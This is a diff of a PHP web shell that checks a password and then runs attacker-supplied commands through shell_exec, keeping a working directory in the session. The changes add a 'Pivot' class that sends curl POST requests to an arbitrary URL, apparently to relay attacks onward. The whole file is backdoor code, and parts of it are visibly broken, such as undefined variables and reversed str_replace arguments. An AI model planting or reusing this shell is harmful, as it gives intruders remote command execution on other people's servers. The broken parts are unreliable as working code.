@@ -1,17 +1,17 @@
 <?php
 #Classes
-  session_name("shuffle_id");
-  session_start();
+session_name("shuffle_id");
+session_start();
 
 	Class System{
-		<password>;		
-		public function get_password(){
+	<password>;		
+	public function get_password(){
 			return self::$password;
 		}
 	}
 	Class Conect extends System {
 		public function __construct($get,$post){
-			$this->pass = $_POST['pass'];
+			$this->pass = isset($_POST['pass']) ? $_POST['pass'] : null ;
 		}
 		public function connection(){
 			if(!empty($this->pass)){
@@ -23,15 +23,15 @@
 					$response = array('response' => "false",'msg'=>'Invalid Password');
 				}
 			}else{
-				$response = array('response' => "false",'msg'=>'No method received');
+				$response = array('response' => "false",'msg'=>'No password received');
 			}
 			return $response;
 		}
 		public function conection(){
 			if($this->pass == $this->get_password()){
-				$response =  array('response' => true);
+				$response =  array('response' => "true");
 			}else{
-				$response = array('response' => false,'msg'=>'Invalid Password');
+				$response = array('response' => "false",'msg'=>'Invalid Password');
 			}
 			return $response;
 		}
@@ -48,13 +48,13 @@
 			$this->pwd = $this->set_pwd();
 		}
 		public function execute(){
-			if($this->conection['response']){
+			if($this->conection['response'] == "true"){
 				if($this->set_execute()){
 					return 'Directory Not Found';
 				}else{
 					if(!empty(shell_exec($this->cmd))){
 						#chdir($_SESSION['pwd']);
-						return shell_exec($this->cmd);
+						return shell_exec("cd ".$_SESSION['pwd'].";".$this->cmd);
 					}else{
 						return 'Command Not Found';
 					}
@@ -88,16 +88,24 @@
 		public function set_pwd($pwd = null){
 			if(empty($_SESSION['pwd'])){
 				$_SESSION['pwd'] = trim(getcwd(), "/");
+				$_SESSION['pwd'] = "/".$_SESSION['pwd'];
 			}elseif($pwd != null){
 				if($pwd == ".."){
 					$foward = $this->foward_dir();
 					if($this->folder_exist($foward) != false){
 						$_SESSION['pwd'] = trim($foward, "/");
+						$_SESSION['pwd'] = "/".$_SESSION['pwd'];
 						return true;
 					}else{
 						return false;
 					}
 				}else{
+					if(strpos($pwd,"/")){
+						$pwd = str_replace($pwd, "/", "");
+						$pwd = "/".$pwd;
+					}else{
+						$pwd = "/".$pwd;
+					}
 					if($this->folder_exist($_SESSION['pwd'].$pwd) != false){
 						$_SESSION['pwd'] = $_SESSION['pwd'].$pwd;
 						return true;
@@ -144,11 +152,51 @@
 			return $user_bash;
 		}
 	}
+	Class Pivot extends Conect {
+		public function __construct($get,$conection){
+			if(!empty($get['cmd'])){
+				$this->cmd = $get['cmd'];
+			}else{
+				$this->cmd = "";
+			}
+			$this->conection = $conection;
+		}
+		public function send($url){
+			$url = $file_name;
+			$fields = array(
+			            '__VIEWSTATE'=>urlencode($state),
+			            '__EVENTVALIDATION'=>urlencode($valid),
+			            'btnSubmit'=>urlencode('Submit')
+			        );
+			
+			//url-ify the data for the POST
+			foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
+			$fields_string = rtrim($fields_string,'&');
+			
+			//open connection
+			$ch = curl_init();
+			
+			//set the url, number of POST vars, POST data
+			curl_setopt($ch,CURLOPT_URL,$url);
+			curl_setopt($ch,CURLOPT_POST,count($fields));
+			curl_setopt($ch,CURLOPT_POSTFIELDS,$fields_string);
+			
+			//execute post
+			$result = curl_exec($ch);
+			print $result;
+		}
+	}
+
 #Class Instance
 if(isset($_POST['cmd'])){
 	if($_POST['cmd'] == "shuffle-auth"){
 		$conection = new Conect($_GET,$_POST);
 		$response = $conection->connection();
+		echo json_encode($response);
+		exit();
+	}
+	if($_POST['cmd'] == "shuffle-pivot"){
+		$conection = new Conect($_GET,$_POST);
 		echo json_encode($response);
 		exit();
 	}
@@ -166,4 +214,3 @@ $server = New Server($_POST,$conection->conection());
 					  );
 		//Response to Shelly				
 		echo json_encode($json);
-	
